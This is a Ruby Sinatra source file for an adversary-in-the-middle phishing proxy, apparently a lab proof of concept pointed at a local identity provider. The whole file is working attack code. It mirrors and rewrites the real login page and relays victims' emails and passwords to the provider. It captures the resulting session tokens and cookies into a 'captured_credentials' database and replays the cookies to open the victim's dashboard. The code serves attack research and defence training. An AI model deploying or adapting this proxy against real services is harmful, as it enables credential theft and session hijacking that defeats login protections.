#----------------------------------
#       PROXY - AiTM
#----------------------------------

require 'sinatra/base'
require 'sinatra/contrib'
require 'faraday'
require 'sequel'
require 'sqlite3'
require 'dotenv/load'
require 'uri'
require 'net/http'

# DB propia del proxy — separada del IdP
# En el ataque real el atacante tiene su propio servidor
PROXY_DB = Sequel.connect("sqlite://#{__dir__}/../captured_credentials.db")

PROXY_DB.create_table?(:captured_credentials) do
  primary_key :id
  String   :email
  String   :token
  String   :ip
  String   :user_agent
  String   :session_cookie
  DateTime :captured_at
end

IDP_URL   = ENV['IDP_URL']   || 'http://localhost:4444'
PROXY_URL = ENV['PROXY_URL'] || 'http://localhost:4445'

class AvatarProxy < Sinatra::Base
  use Rack::Session::Cookie,
      key: "proxy_session",
      secret: "proxy_vaatu_secret_future_industries_poc_2024_long_enough_string"

  set :public_folder, File.join(__dir__, '..', 'public')
  set :static, true

  helpers do
    def rewrite_html(html)
      html.gsub(IDP_URL, PROXY_URL)
          .gsub("localhost:4444", "localhost:4445")
    end
  end

  get "/" do
    redirect "/login"
  end

  get "/login" do
    idp_response = Faraday.get("#{IDP_URL}/login")
    content_type 'text/html'
    rewrite_html(idp_response.body)
  end

  post "/login" do
    email    = params[:email].to_s.downcase.strip
    password = params[:password].to_s

    puts "Proxy: Received login attempt for #{email}"

    # Hacemos el POST directamente con Net::HTTP para no seguir redirects
    uri = URI("#{IDP_URL}/login")
    req = Net::HTTP::Post.new(uri)
    req['Content-Type'] = 'application/x-www-form-urlencoded'
    # Reenviar headers del navegador para que la petición al IdP sea lo más similar posible
    req['User-Agent'] = request.user_agent if request.user_agent
    req['Accept'] = request.env['HTTP_ACCEPT'] if request.env['HTTP_ACCEPT']
    req['Accept-Language'] = request.env['HTTP_ACCEPT_LANGUAGE'] if request.env['HTTP_ACCEPT_LANGUAGE']
    req['Origin'] = request.env['HTTP_ORIGIN'] if request.env['HTTP_ORIGIN']
    req['Referer'] = request.env['HTTP_REFERER'] if request.env['HTTP_REFERER']
    req['Connection'] = request.env['HTTP_CONNECTION'] if request.env['HTTP_CONNECTION']

    req.body = URI.encode_www_form({
      email:    email,
      password: password
    })

    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = (uri.scheme == 'https')
    idp_response = http.request(req)

    # Log de depuración: mostrar headers entrantes y respuesta del IdP
    puts "[proxy] Incoming request headers: #{request.env.select { |k,_| k.start_with?('HTTP_') }}"

    if idp_response.code.to_i == 302
      location       = idp_response['location']
      token          = location.to_s.match(/token=(.+)/)[1] rescue nil
      raw_cookie     = idp_response['set-cookie']
      session_cookie = raw_cookie.to_s.split(';').first rescue nil
      puts "[proxy] IdP response headers: #{idp_response.to_hash.inspect}"

      if token && session_cookie
        # Guarda en la DB propia del proxy
        PROXY_DB[:captured_credentials].insert(
          email:          email,
          token:          token,
          ip:             request.ip,
          user_agent:     request.user_agent,
          session_cookie: session_cookie,
          captured_at:    Time.now
        )

        session[:user]       = email
        session[:token]      = token
        session[:idp_cookie] = session_cookie

        puts "Proxy: Redirecting to /dashboard"
        redirect "/dashboard"
      else
        puts "Proxy: Token or session_cookie missing, showing login again"
        content_type 'text/html'
        rewrite_html(Faraday.get("#{IDP_URL}/login").body)
      end
    else
      puts "Proxy: IDP did not return 302, showing login again"
      content_type 'text/html'
      rewrite_html(Faraday.get("#{IDP_URL}/login").body)
    end
  end

  get "/dashboard" do
    puts "Proxy: Accessing /dashboard, session[:user]: #{session[:user]}"
    halt 401, "Not authorized" unless session[:user]

    puts "Proxy: Fetching dashboard from IDP with cookie: #{session[:idp_cookie]}"
    idp_response = Faraday.get("#{IDP_URL}/dashboard") do |req|
      req.headers['Cookie'] = session[:idp_cookie]
    end

    puts "Proxy: IDP dashboard response status: #{idp_response.status}"
    content_type 'text/html'
    rewrite_html(idp_response.body)
  end

  get "/logout" do
    session.clear
    redirect "/login"
  end
end